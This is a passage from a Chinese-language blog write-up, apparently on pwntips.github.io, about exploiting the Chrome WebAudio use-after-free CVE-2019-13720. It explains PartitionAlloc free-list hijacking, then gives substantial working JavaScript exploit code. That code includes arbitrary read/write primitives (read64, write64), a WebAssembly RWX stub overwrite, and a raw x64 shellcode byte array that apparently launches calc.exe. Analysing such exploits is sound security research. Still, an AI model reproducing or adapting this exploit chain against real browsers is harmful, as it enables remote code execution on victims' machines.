<p>我们已经构造出使用同一地址的 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 和 <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code> 两个对象。接下来把 <code class="language-plaintext highlighter-rouge">IIRFilter</code> 销毁，再创建另一个 <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code> 对象，由于两个对象共用同一块内存，此操作就相当于把前一个 <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code> 的内容改写掉了。之后再把第二个 <code class="language-plaintext highlighter-rouge">DataHolder</code> 销毁， <code class="language-plaintext highlighter-rouge">DataHolder</code> 的第一个 QWORD 的值被改为空闲链表的下一项，但由于这个地方存储的是引用计数 <code class="language-plaintext highlighter-rouge">ref_count_</code> ，改写后还是一个合理的引用计数，并不影响 <code class="language-plaintext highlighter-rouge">DataHolder</code> 后续使用。而 0x10 处存放的缓冲区 <code class="language-plaintext highlighter-rouge">DataHolder::data_</code> 内容不变，但是其所指向的内存已经被释放掉了。这个缓冲区可以通过 <code class="language-plaintext highlighter-rouge">ArrayBuffer::getChannelData(0).buffer</code> 访问到，这样我们通过第一个 <code class="language-plaintext highlighter-rouge">DataHolder</code> 就可以访问到已经被释放的 <code class="language-plaintext highlighter-rouge">DataHolder::data_</code>。</p>

<pre><code class="language-JavaScript">async function kickPayload(auxArray) {
	let audioCtx = new OfflineAudioContext(1, 1, 3000);
	let partitionPagePtr = getPartitionPageMetadataArea(byteSwapBigInt(auxArray[0]));
	auxArray[0] = byteSwapBigInt(partitionPagePtr);
	let i = 0;
	do {
    		gcPreventer.push(new ArrayBuffer(8));
    		if (++i &gt; 0x100000)
        		return;
	} while (auxArray[0] != BigInt(0));
	let freelist = new BigUint64Array(new ArrayBuffer(8));
	gcPreventer.push(freelist);

	...

</code></pre>

<p>以 <code class="language-plaintext highlighter-rouge">audioBufferArray1[j].getChannelData(0).buffer</code> 为缓冲，创建一个 <code class="language-plaintext highlighter-rouge">BigUint64Array</code> <code class="language-plaintext highlighter-rouge">auxArray</code> 就可以读写这块已经释放的内存。<code class="language-plaintext highlighter-rouge">auxArray</code> 开头的 8 字节已经被写入后继空闲块的地址，读出这个地址，计算出本页面元数据的地址，用元数据的地址替换后续空闲块地址，之后申请多个 8 字节的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，直到 <code class="language-plaintext highlighter-rouge">auxArray</code> 被填充成 0。<code class="language-plaintext highlighter-rouge">auxArray</code> 只有到被当做 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 分配出来时，才会被 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的构造函数填 0。这个时候元数据中的 FreeListHead，已经被写入了之前在 <code class="language-plaintext highlighter-rouge">auxArray[0]</code> 中存储的值 <code class="language-plaintext highlighter-rouge">&amp;FreeListHead</code>，也就是说这个时候 FreeListHead 指向了它本身。之后在申请 8 字节的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，就把 FreeListHead 所在内存块当做 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 分配出，这样一来，修改 <code class="language-plaintext highlighter-rouge">freelist[0]</code> 的值，就相当于修改 FreeListHead 的指向。把 <code class="language-plaintext highlighter-rouge">freelist[0]</code> 改成任意地址，再申请 8 字节的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，就得到了指向这个地址 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，也就是得到了任意地址读写的能力。另外由于 FreeListHead 已经被我们“挪用”了，为了保证利用代码的稳定，申请到的 8 字节对象都不能再被释放了，需要加入到 gcPreventer 数组中防止 GC 回收。</p>

<hr />

<p><strong>ℹ️NOTE</strong>*: 卡巴斯基的分析中提到，这部分代码还有整理碎片内存，提升漏洞利用稳定性的作用，水平所限我还不能理解这部分功能，这里先忽略了。</p>

<hr />

<pre><code class="language-JavaScript">function read64(rwHelper, addr) {
  rwHelper[0] = addr;
  var tmp = new BigUint64Array;
  tmp.buffer;
  gcPreventer.push(tmp);
  return byteSwapBigInt(rwHelper[0]);
}

function write64(rwHelper, addr, value) {
  rwHelper[0] = addr;
  var tmp = new BigUint64Array(1);
  tmp.buffer;
  tmp[0] = value;
  gcPreventer.push(tmp);
}
</code></pre>

<p><code class="language-plaintext highlighter-rouge">freeList</code> 配合上这两个函数，就可以实现任意内存读写了。<code class="language-plaintext highlighter-rouge">read64</code> 把目标地址填入链表头，之后申请内存，就相当于读取链表头地址的前 8 字节，交换大小端后存入链表头。<code class="language-plaintext highlighter-rouge">write64</code> 把目标地址存入链表头，之后申请内存，申请到的内存块就指向之前填入的地址，写入此内存块就是写入目标地址。</p>

<h4 id="执行-shellcode">执行 shellcode</h4>

<p>接下来执行 shellcode：</p>

<ul>
  <li>实例化 WASM 模块构造一段 RWX 内存区域，将导出函数 main 赋值到 wasmFuncA</li>
  <li>预测 fileReaderLoader 的地址</li>
  <li>创建 fileReader，将 fileReader.onerror 设置为 wasmFuncA</li>
  <li>用 fileReaderLoader 计算出 fileReader 的地址，再从 fileReader 的事件处理中读取到 wasmFuncA ，最终读取到 RWX 内存区的地址</li>
  <li>预测 <code class="language-plaintext highlighter-rouge">WTF::ArrayBuffer</code> 的地址，之后创建 <code class="language-plaintext highlighter-rouge">AudioBuffer</code></li>
  <li>根据预测的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的地址，改写 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 指向到 RWX 内存区域</li>
  <li>把 shellcode 写入 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code></li>
  <li>调用 wasmFuncA，触发 shellcode 执行</li>
</ul>

<p>获取 filereaderLoader 对象地址的方法需要额外说明下，前面介绍过每个 Partition 都有一组桶，用来查找包含指定大小内存块的 PartitionPage，如果可以读到这个桶中当前存放的数据，就可以预测到下次内存分配的结果，<code class="language-plaintext highlighter-rouge">getPartitionPageFreeListHeadEntryBySlotSize</code> 就是按照这个思路实现的，PartitionPage 的元数据中存放了指向桶的指针，已知 <code class="language-plaintext highlighter-rouge">iirFilterFeedforwardAllocationPtr</code> 指向 0x30 字节的内存块，可以利用它的值读到 0x30 的桶，所有的桶共都存储在同一个数组中，有了 0x30 的桶，我们加上固定的偏移，就可以得到其他大小的桶。从桶中读出活动页面 PartitionPage 元数据的指针，再从元数据中读出下一个空闲内存块的地址。</p>

<pre><code class="language-JavaScript">async function kickPayload(auxArray) {

...
	// 接上部分
	const wasmBuffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
	const wasmBlob = new Blob([wasmBuffer], {
		type: "application/wasm"
	});

  const wasmUrl = URL.createObjectURL(wasmBlob);
	var wasmFuncA = undefined;
	let result = await WebAssembly.instantiateStreaming(fetch(wasmUrl), {})
	wasmFuncA = result.instance.exports.main;

	// 预测 fileReaderLoader 地址
	let fileReader = new FileReader;
	let fileReaderLoaderSize = 0x140;

	let fileReaderLoaderPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist,
		iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);
	if (!fileReaderLoaderPtr)
		return;

	fileReader.readAsArrayBuffer(new Blob([]));

	let fileReaderLoaderTestPtr =
		getPartitionPageFreeListHeadEntryBySlotSize(freelist,
		iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);
	if (fileReaderLoaderPtr == fileReaderLoaderTestPtr)
		return;

	// 设置 fileReader 的 onerror 事件处理
	fileReader.onerror = wasmFuncA;

	// fileReaderLoader -&gt; fileReader -&gt; onerror/wasmFuncA -&gt; RWX
	let fileReaderPtr = read64(freelist,
		fileReaderLoaderPtr + BigInt(0x10)) - BigInt(0x68);
	let vectorPtr = read64(freelist, fileReaderPtr + BigInt(0x28));
  let registeredEventListenerPtr = read64(freelist, vectorPtr);
  let eventListenerPtr = read64(freelist, registeredEventListenerPtr);
  let eventHandlerPtr = read64(freelist, eventListenerPtr + BigInt(0x8));
  let jsFunctionObjPtr = read64(freelist, eventHandlerPtr + BigInt(0x8));

  let jsFunctionPtr = read64(freelist, jsFunctionObjPtr) - BigInt(1);
  let sharedFuncInfoPtr = read64(freelist,
	  jsFunctionPtr + BigInt(0x18)) - BigInt(1);
  let wasmExportedFunctionDataPtr = read64(freelist,
	  sharedFuncInfoPtr + BigInt(0x8)) - BigInt(1);
  let wasmInstancePtr = read64(freelist,
	  wasmExportedFunctionDataPtr + BigInt(0x10)) - BigInt(1);
	 
  let stubAddrFieldOffset = undefined;
  switch (majorVersion) {
    case 77:
      stubAddrFieldOffset = BigInt(0x8) * BigInt(16);
      break;

    case 76:
      stubAddrFieldOffset = BigInt(0x8) * BigInt(17);
      break;
  }
  let stubAddr = read64(freelist, wasmInstancePtr + stubAddrFieldOffset);

	// 预测 ArrayBuffer 的地址
  let arrayBufferSize = 0x20;
  let arrayBufferPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilterFeedforwardAllocationPtr, arrayBufferSize);
  if (!arrayBufferPtr)
    return;

  let audioBuffer = audioCtx.createBuffer(1, 0x400, 6000);
  gcPreventer.push(audioBuffer);

	// 修改 DataHolder 的 data_ 和 data_length_
  let dataHolderPtr = read64(freelist, arrayBufferPtr + BigInt(0x8));
  write64(freelist, dataHolderPtr + BigInt(0x8), stubAddr);
  write64(freelist, dataHolderPtr + BigInt(0x10), BigInt(0xFFFFFFF));

  // 用 shellcode 改写 wasmFuncA
  let shellcode = new Uint8Array([
    0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58,
    0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48, 0x8B, 0x5B, 0x20, 0x48,
    0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49,
    0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31,
    0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08,
    0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44,
    0x8B, 0x52, 0x1C, 0x4D, 0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44,
    0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,
    0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59,
    0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2, 0x51, 0x48, 0x8B, 0x0C,
    0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01,
    0xC7, 0x48, 0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF,
    0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04, 0x44, 0x41,
    0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53, 0xC3, 0x48, 0x31,
    0xC9, 0x80, 0xC1, 0x07, 0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91,
    0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,
    0x08, 0x50, 0x51, 0xE8, 0xB0, 0xFF, 0xFF, 0xFF, 0x49, 0x89,
    0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7, 0xE1, 0x50, 0x48, 0xB8,
    0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7,
    0xD0, 0x50, 0x48, 0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83,
    0xEC, 0x30, 0x66, 0x81, 0xE4, 0xF0, 0xFF, 0x41, 0xFF, 0xD6
  ]);

  let payloadArray = new Uint8Array(audioBuffer.getChannelData(0).buffer);
  payloadArray.set(shellcode, 0);

	// FreeListHead 填 0
  write64(freelist, partitionPagePtr, BigInt(0));

  try {
    wasmFuncA();
  } catch (e) { }
}

</code></pre>

<pre><code class="language-JavaScript">function getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirAddr, slot_size) {
  let meta = getPartitionPageMetadataArea(iirAddr);

  let getMetaByPageIndex = function (i) {
    const sizeOfMeta = BigInt(0x20);
    return meta + BigInt(i) * sizeOfMeta;
  }

  const offsetBucket = BigInt(0x10);
  let slot = read64(freelist, meta + offsetBucket);
  const offsetSlotSize = BigInt(0x18);
  const maskSlotSize = BigInt(0xffffffff);
  const offsetActivePage = BigInt(0);
 
  curSlotSize = read64(freelist, slot + offsetSlotSize) &amp; maskSlotSize;
 
  let bucket = undefined;
  let bucket_size = 0;
  let delta = BigInt(0);

  switch (slot_size) {
    default:
      throw 'invalid slot size';
     break; case 0x140:
      delta = BigInt(0x2c0);
     break; case 0x20:
      delta = BigInt(-128);
  }

  let getSlotSize = (slot) =&gt; read64(freelist,
	  slot + delta + offsetSlotSize) &amp; maskSlotSize;
  let getSlotHead = (slot) =&gt; read64(freelist,
	  slot + delta + offsetActivePage);

  next_slot = read64(freelist, getSlotHead(slot));
  return next_slot;
}
</code></pre>

<h2 id="reference">Reference</h2>

<ul>
  <li>https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html</li>
  <li>https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/</li>
  <li>https://www.anquanke.com/post/id/244743</li>
</ul>

  </div><div id="disqus_thread"></div>
  <script>
    var disqus_config = function () {
      this.page.url = '';
      this.page.identifier = 'https://pwntips.github.io/2022/05/26/CVE-2019-13720.html';
    };

    (function() {
      var d = document, s = d.createElement('script');

      s.src = 'https://PwnTips.disqus.com/embed.js';

      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript><a class="u-url" href="/2022/05/26/CVE-2019-13720.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="https://pwntips.github.io/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p>Tips &amp; Tricks</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
